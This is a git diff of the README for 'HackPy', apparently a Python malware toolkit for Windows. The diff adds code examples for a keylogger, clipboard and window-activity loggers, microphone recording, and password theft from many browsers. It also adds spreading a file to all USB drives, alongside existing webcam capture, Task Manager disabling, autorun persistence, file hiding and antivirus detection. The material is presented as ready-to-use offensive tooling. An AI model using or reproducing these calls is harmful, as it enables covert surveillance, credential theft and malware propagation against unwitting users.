@@ -13,7 +13,7 @@ import hackpy
 ![SystemInfo](https://i.ibb.co/b3gmsxg/hackpy-System-Info.png)
 ``` python
 print(
-    '\nWelcome to HackPy!\n'                  +
+    '\nWelcome to HackPy 0.1.6\n'             +
     '\nUsername: '     + hackpy.userInfo      +
     '\nVersion: '      + hackpy.versionInfo   +
     '\nRelease: '      + hackpy.releaseInfo   +
@@ -36,6 +36,27 @@ hackpy.webcamScreenshot(filename = 'screenshot.png', delay = 4500, camera = 1)
 hackpy.desktopScreenshot(filename = 'desktop.png')
 ```
 
+# Record audio from microphone
+``` python
+# Save audio record to file recording.wav, 20 secounds
+hackpy.recordAudio(filename = 'recording.wav', time = 20)
+```
+
+# Passwords recovery
+![SITE](https://i.ibb.co/nnjYFxV/hackpy-passwords-Recovery.png)
+Get passwords from Chrome, Opera, Chromium, Amigo, Atom, Vivaldo, Orbitum, Kometa, Comodo, 360Browser, K-Melon, Maxthon3, Nichrome, CocCoc, Uran, Chromodo browsers..
+``` python
+from hackpy.passwords import *
+
+for key, account in passwordsRecovery():
+    print(
+        '\n['  + str(key) + ']'
+        '\n |____ SITE: ' + account['url'] + 
+        '\n |____ USER: ' + account['login'] + 
+        '\n |____ PASS: ' + account['password']
+        )
+```
+
 # TaskManager
 ``` python
 # If process iexplore.exe found:
@@ -49,10 +70,12 @@ if hackpy.taskmanager('iexplore.exe').find():
 for process in hackpy.taskmanager.list(): 
     print(process)
 
+# Get PID of process
+pid = hackpy.taskmanager.getpid('firefox.exe')
 # Disable windows taskmgr.exe
 hackpy.taskmanager.disable()
 # Enable windows taskmgr.exe
-hackpy.taskmanager.enable() 
+hackpy.taskmanager.enable()
 ```
 
 # Autorun
@@ -64,28 +87,84 @@ hackpy.autorun('C:\\Windows\\System32\\cmd.exe').install()
 hackpy.autorun('C:\\Windows\\System32\\cmd.exe').uninstall()
 ```
 
+# Key Logger
+``` python
+# Log all pressed keys. Format: (DATE) - [PROGRAM TITLE] - "keys"
+from hackpy.keyboard import *
+
+keylogger = Keylogger(filename = 'keylogs.txt')
+# Start logger
+keylogger.start()
+# Stop logger
+keylogger.stop()
+# Show logger logs
+for line in keylogger.getLogs():
+    print(line)
+# Delete logs file
+keylogger.cleanLogs()
+```
+
+# Clipboard Logger
+``` python
+# Log all clipboard changes. Format: (DATE) - [PROGRAM TITLE] - "Clipboard text"
+cliplogger = hackpy.clipboard.Clipboardlogger('clipboardlogger.txt')
+# Start logger
+cliplogger.start()
+# Stop logger
+cliplogger.stop()
+# Show logs
+for line in cliplogger.getLogs():
+    print(line)
+# Delete logs file
+cliplogger.cleanLogs()
+```
+
+# Program Activity Logger
+``` python
+# Log all opened program titles. Format: (DATE) - "Program title"
+from hackpy.activity import *
+
+activitylogger = ProgramActivitylogger('programActivityLogger.txt')
+# Start logger
+activitylogger.start()
+# Stop logger
+activitylogger.stop()
+# Show logs
+for line in activitylogger.getLogs():
+    print(line)
+# Delete logs file
+activitylogger.cleanLogs()
+```
+
 # Check if program running as admin
 ``` python
 if (hackpy.isAdmin()): # return True if program started as admin
     print('Program started as admin! Loading cmd.exe')
     status = hackpy.file.startAsAdmin('cmd.exe') # return true in [0] if all is okay and message in [1]
     print('Okay, debugMessage:', status[1])
-
 else:
     print('Program started as user!')
 ```
 
 # Simple file control
 ``` python
-hackpy.file.exists('file.txt')                # Return True or False
-hackpy.file.remove('file.txt')                # Remove file
-hackpy.file.rename('file.txt', 'newfile.txt') # Rename file
-hackpy.file.copy('file.txt', 'C:\\Windows')   # Copy file
-hackpy.file.scan('C:\\')                      # Return all files in directory
-hackpy.file.start('file.txt')                 # Start file 
-hackpy.file.startAsAdmin('file.txt')          # Start file as admin
-hackpy.file.atributeHidden('file.txt')        # Hide file
-hackpy.file.atributeNormal('file.txt')        # Show file
+filemanager = hackpy.file
+
+filemanager.getsize('file.txt')               # Return file size in bytes
+filemanager.exists('file.txt')                # Return True or False
+filemanager.remove('file.txt')                # Remove file
+filemanager.rmtree('dir1\\dir2\\dir3')        # Remove dirs
+filemanager.rename('file.txt', 'newfile.txt') # Rename file
+filemanager.copy('file.txt', 'C:\\Windows')   # Copy file
+filemanager.scan('C:\\')                      # Return all files in directory
+filemanager.start('file.txt')                 # Start file 
+filemanager.startAsAdmin('file.txt')          # Start file as admin
+filemanager.atributeHidden('file.txt')        # Hide file
+filemanager.atributeNormal('file.txt')        # Show file
+
+ # Get files tree. (You can use tree('.') to get files tree in current directory)
+for file in filemanager.tree('C:\\'):
+    print(file)
 ```
 
 # Detect installed antivirus software on computer:
@@ -93,6 +172,15 @@ hackpy.file.atributeNormal('file.txt')        # Show file
 data = hackpy.detectProtection()
 for antivirus in data:
     print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])
+```
+
+# UsbSpread
+``` python
+print('Copying file to all drives...')        # Need Admin Rights
+success_drives = hackpy.usbSpread('file.txt') # Returns a list of drives to which the file was copied successfully
+
+for drive in success_drives:
+    print('Successfully copied to: ' + drive)
 ```
 
 # Ping
@@ -205,21 +293,6 @@ hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
 hackpy.command.system('shutdown -s -t 260')
 ```
 
-# Passwords recovery
-![SITE](https://i.ibb.co/nnjYFxV/hackpy-passwords-Recovery.png)
-Working only with Chrome!
-``` python
-hackpy.passwords import *
-
-for key, account in passwordsRecovery().items():
-    print(
-        '\n['  + str(key) + ']'
-        '\n|____ site: ' + account['url'] + 
-        '\n |___ user: ' + account['login'] + 
-        '\n  |__ pass: ' + account['password']
-        )
-```
-
 # Mouse, Windows control
 ``` python
 import hackpy.activity
@@ -250,14 +323,14 @@ print('Now ' + time.date.year() + ' year!')
 
 # SendKeyPress:
 ``` python
-hackpy.sendKey('Hello bro{ENTER}')
+from hackpy.keyboard import *
+
+keyPress('Hello bro{ENTER}')
 # Other keys: https://pastebin.com/Ns3P7UiH
 ```
 
 # Clipboard
 ``` python
-import hackpy.clipboard
-
 # Get text from clipboard:
 data = hackpy.clipboard.get()
 print('Text in clipboard is ' + data)
